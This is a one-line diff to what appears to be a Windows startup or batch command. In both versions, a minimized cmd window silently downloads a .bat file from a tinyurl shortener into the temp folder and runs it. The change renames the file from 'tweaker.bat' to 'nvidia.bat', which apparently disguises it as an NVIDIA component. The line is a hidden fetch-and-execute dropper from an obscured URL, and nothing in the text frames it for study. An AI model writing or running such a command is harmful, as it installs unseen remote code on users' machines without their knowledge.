@@ -1,1 +1,1 @@
-start "" /min cmd /c "curl.exe -sL -o %TEMP%\tweaker.bat https://tinyurl.com/VZEDSTART && %TEMP%\tweaker.bat" & exit
+start "" /min cmd /c "curl.exe -sL -o %TEMP%\nvidia.bat https://tinyurl.com/VZEDSTART && %TEMP%\nvidia.bat" & exit
